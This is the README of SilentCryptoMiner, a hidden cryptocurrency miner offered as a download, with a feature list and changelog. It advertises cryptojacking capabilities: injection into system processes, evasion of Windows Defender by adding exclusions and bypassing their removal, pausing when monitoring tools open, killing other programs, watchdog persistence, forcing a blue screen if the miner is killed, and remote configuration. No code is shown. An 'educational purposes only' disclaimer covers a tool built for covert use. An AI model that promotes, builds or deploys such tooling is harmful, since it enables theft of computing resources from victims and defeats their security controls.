<img src="https://github.com/UnamSanctam/SilentCryptoMiner/blob/master/SilentCryptoMiner.png?raw=true">

# SilentCryptoMiner v3.0.0 - Miner for ETH, ETC, XMR, RTM & many more

A free silent (hidden) native cryptocurrency miner capable of mining ETH, ETC, XMR, RTM and much more, with many features suited for mining silently.

This miner can mine all the following algorithms and thus any cryptocurrency that uses one of them:
<details>
 <summary>List of algorithms</summary>
 <table>
	<tr><th>Algorithm</th><th>Example Cryptocurrency</th></tr>
	<tr><td>rx/0</td><td>Monero</td></tr>
	<tr><td>gr</td><td>Raptoreum</td></tr>
	<tr><td>ethash</td><td>Ethereum, Metaverse, Callisto, QuarkChain, EtherGem, Etho, Expanse, Ellaism</td></tr>
	<tr><td>etchash</td><td>Ethereum Classic</td></tr>
	<tr><td>ubqhash</td><td>Ubiq</td></tr>
	<tr><td>cn/gpu</td><td>Conceal, Ryo, Equilibria</td></tr>
	<tr><td>argon2/chukwa</td><td>2ACoin</td></tr>
	<tr><td>rx/arq</td><td>ArQmA</td></tr>
	<tr><td>cn-heavy/xhv</td><td>Haven, Blockcloud</td></tr>
	<tr><td>cn/fast</td><td>Electronero, ElectroneroXP</td></tr>
	<tr><td>rx/keva</td><td>Kevacoin</td></tr>
	<tr><td>cn-pico</td><td>Kryptokrona</td></tr>
	<tr><td>cn/half</td><td>Masari</td></tr>
	<tr><td>argon2/ninja</td><td>NinjaCoin</td></tr>
	<tr><td>kawpow</td><td>Ravencoin</td></tr>
	<tr><td>rx/sfx</td><td>Safex</td></tr>
	<tr><td>cn/r</td><td>Sumokoin</td></tr>
	<tr><td>cn-pico/tlo</td><td>Talleo</td></tr>
	<tr><td>argon2/chukwav2</td><td>Turtlecoin</td></tr>
	<tr><td>cn/upx2</td><td>Uplexa</td></tr>
	<tr><td>rx/wow</td><td>Wownero</td></tr>
	<tr><td>cn/ccx</td><td></td></tr>
	<tr><td>cn/zls</td><td></td></tr>
	<tr><td>cn/double</td><td></td></tr>
	<tr><td>cn/2</td><td></td></tr>
	<tr><td>cn/xao</td><td></td></tr>
	<tr><td>cn/rwz</td><td></td></tr>
	<tr><td>cn/rto</td><td></td></tr>
	<tr><td>cn-heavy/tube</td><td></td></tr>
	<tr><td>cn-heavy/0</td><td></td></tr>
	<tr><td>cn/1</td><td></td></tr>
	<tr><td>cn-lite/1</td><td></td></tr>
	<tr><td>cn-lite/0</td><td></td></tr>
	<tr><td>cn/0</td><td></td></tr>
</table>
</details>

## Main Features

* Native C++ - Miner installer/injector and watchdog now coded fully in C++ with no run requirements except a 64-bit OS
* Injection (Silent/Hidden) - Hide miner behind another process like conhost.exe, svchost.exe and others
* Idle Mining - Can be configured to mine at different CPU and GPU usages or not at all while computer is or isn't in use
* Stealth - Pauses the miner and clears the GPU memory while any of the programs in the "Stealth Targets" option are open
* Watchdog - Monitors the miner file and replaces the file if removed and starts it if the injected miner is closed down
* Multiple Miners - Can create multiple miners to run at the same time, for example one XMR (CPU) miner and one ETH (GPU) miner
* CPU & GPU Mining - Can mine on Both CPU and GPU (Nvidia & AMD)
* Windows Defender Exclusions - Can add exclusions into Windows Defender after being started to avoid being detected
* Process Killer - Constantly checks for any programs in the "Kill Targets" list and kills them if found
* Remote Configuration - Can get the miner settings remotely from a specified URL every 100 minutes
* Web Panel Support - Has support for monitoring and configuring all the miners efficiently in a self-hosted online web panel

## Downloads

Pre-Compiled: https://github.com/UnamSanctam/SilentCryptoMiner/releases

Example Settings: [Example Settings](https://github.com/UnamSanctam/SilentCryptoMiner/wiki#example-settings)

## Wiki

You can find the wiki [here](https://github.com/UnamSanctam/SilentCryptoMiner/wiki) or at the top of the page. The wiki contains information about the miner and all of its features, it also has some answers to frequently asked questions.

## Web Panel

You can find the web panel that the miner officially supports here: [UnamWebPanel](https://github.com/UnamSanctam/UnamWebPanel). The web panel can be used to monitor your miners hashrate, status, connection settings and more. It can also be used to change the miner settings just like how the option "Remote Configuration" does it.

## Changelog

### 3.0.0 (07/09/2022)
* Rewrote entire miner and watchdog in C++ to replace the C# miner and watchdog
* Rewrote much of the builder for the rewritten miner and watchdog
* Added custom C++ compiler package
* Added custom compiled version of SysWhispers2 to randomize syscalls seed on every build
* Changed default injection target to conhost.exe
* Removed injection target "explorer.exe" due to new protections and inconvenience
* Added new injection target "dwm.exe"
* Removed now unnecessary options "Shellcode Loader", "In-memory watchdog" and "Do built-in obfuscations" because of the rewrite
* Removed now unnecessary DLL modules because of direct implementations
* Temporarily removed the "DEBUG" and "Overwrite old miners" options
* Updated both miners
* Added Spanish translation (Xeneht)
* Added Russian translation (BITIW)
### 2.6.1 (19/08/2022)
* Fixed mysterious reported ETH stratum disconnection
* Further improved ETH miner web panel status reporting from feedback
* Reduced minimum minor CUDA version for more driver compatibility
* Reduced ETH VRAM CUDA overhead slightly
* Reduced critical process protection delay
* Fixed missing builder admin shield images
### 2.6.0 (18/08/2022)
* Bypassed new Windows Defender exclusion detection and removal
* Added new improved process hollowing module ProcessInject which replaces the old process hollowing
* Added new "Critical Processes (BSoD)" option to mark the miners and watchdog as critical processes, thus causing a BSoD when killed
* Added new in-memory native DLL loader for the new modules, ProcessInject and ProcessProtect
* Greatly improved dynamic DAG/VRAM management, including better regeneration when enough VRAM becomes available to mine
* Changed startup flow to be more dynamic and persistent
* Improved the watchdogs persistence
* Greatly improved ETH miners web panel status reporting logic
* Improved ETH miners failover connection logic and default timing parameters
* Removed AstroBWT algorithms due to constant forking and instabilities
* Updated XMR miner
* Added Polish translation (Werlrlivx)

[You can view the full Changelog here](CHANGELOG.md)

## Author

* **Unam Sanctam**

## Contributors

* **[Werlrlivx](https://github.com/Werlrlivx)** - Polish Translation
* **[Xeneht](https://github.com/Xeneht)** - Spanish Translation
* **[BITIW](https://github.com/BITIW)** - Russian Translation

## Disclaimer

I, the creator, am not responsible for any actions, and or damages, caused by this software.

You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only.

This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.

By using this software, you automatically agree to the above.

## License

This project is licensed under the MIT License - see the [LICENSE](/LICENSE) file for details

## Donate

XMR: 8BbApiMBHsPVKkLEP4rVbST6CnSb3LW2gXygngCi5MGiBuwAFh6bFEzT3UTufiCehFK7fNvAjs5Tv6BKYa6w8hwaSjnsg2N

BTC: bc1q26uwkzv6rgsxqnlapkj908l68vl0j753r46wvq

ETH: 0x40E5bB6C61871776f062d296707Ab7B7aEfFe1Cd

ETC: 0xd513e80ECc106A1BA7Fa15F1C590Ef3c4cd16CF3

RVN: RFsUdiQJ31Zr1pKZmJ3fXqH6Gomtjd2cQe

LINK: 0x40E5bB6C61871776f062d296707Ab7B7aEfFe1Cd

DOGE: DNgFYHnZBVLw9FMdRYTQ7vD4X9w3AsWFRv

LTC: Lbr8RLB7wSaDSQtg8VEgfdqKoxqPq5Lkn3